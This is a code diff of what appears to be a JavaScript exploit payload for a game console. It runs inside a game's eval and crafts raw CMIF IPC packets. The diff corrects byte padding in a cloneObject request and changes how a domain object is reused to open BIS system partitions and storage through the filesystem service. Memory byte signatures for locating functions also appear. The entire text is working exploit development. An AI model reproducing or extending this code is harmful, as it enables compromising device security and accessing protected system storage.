@@ -65,7 +65,7 @@
   // accepts any of them (mirrors crc32.expected in targets/civ7/target.json).
   const CRC_OK = [157086863n, 3297870604n];
 
-  const VERSION = 'ldn-18';  // FS-stage helpers: the same CMIF framing the PC engine uses
+  const VERSION = 'ldn-19';  // FS-stage helpers: the same CMIF framing the PC engine uses
   // (shared/ipc.cjs + shared/domain.cjs), ported to run inside the eval.
   const FSF = {
     getService: [0x14CC90n, 'fd7bbea9f44f01a9fd030091f30300aa020100b4280040395f0400f181050054ed031faaeb031faaea031faa05000014ed031faaeb031faaea031faae8031f2a'],
@@ -313,11 +313,15 @@
       }
       await say('[f4] mount ' + (mount ? mount.name + ' session ' + mount.handle + ' obj ' + mount.objId : 'not found'));
 
-      let rooted = 0xffffffff;
+      let rooted = 0xffffffff, domRoot = null;
       if (mount) {
-        // Reference cloneObject: Control word0=5, cmd 1, object id at +32.
+        // Reference cloneObject = prepPacket(5, 9, [[16,magic],[24,1],[32,obj]]):
+        // magic at byte 16, cmd at byte 24, object id at byte 32. The ldn-18
+        // array packed magic at byte 14 (only six pad bytes) — that misaligned
+        // the svc header walk, same off-by-padding failure mode as the old
+        // pathPacket. Now byte-for-byte the reference layout.
         const cr = await xfer('clone',
-          [...le32(5), ...le32(9), ...new Array(6).fill(0),
+          [...le32(5), ...le32(9), ...new Array(8).fill(0),
             83, 70, 67, 73, ...new Array(4).fill(0), ...le32(1),
             ...new Array(4).fill(0), ...le32(Number(mount.objId))],
           mount.handle);
@@ -343,17 +347,18 @@
         // Mount-table route unavailable/blocked: BIS over the proven domain
         // wrap. The path buffer now holds '/' before the open (result 11
         // was PathNotFound on the zero-filled buffer, for both ids).
-        const root = await toDomain();
-        if (!root) return;
+        domRoot = await toDomain();
+        if (!domRoot) return;
         let bis = null;
         for (const id of [31, 30]) {
-          bis = await xfer('bis', domainPacket(root, 11, le32(id),
+          bis = await xfer('bis', domainPacket(domRoot, 11, le32(id),
             {send: [{address: pathB, size: 0x301}]}), fsp, true);
           if (bis && bis.result === 0) { rooted = 0; break; }
         }
         await say('[f5] BIS open result ' + (bis ? bis.result : 'x'));
       }
-      const stor = await xfer('storage', domainPacket(root, 200, [], {}), fsp, true);
+      if (!domRoot) { domRoot = await toDomain(); if (!domRoot) return; }
+      const stor = await xfer('storage', domainPacket(domRoot, 200, [], {}), fsp, true);
       if (!stor || stor.result !== 0 || !stor.objects.length) {
         await say('fs FAIL: OpenStorage ' + (stor ? stor.result : 'x')); return;
       }
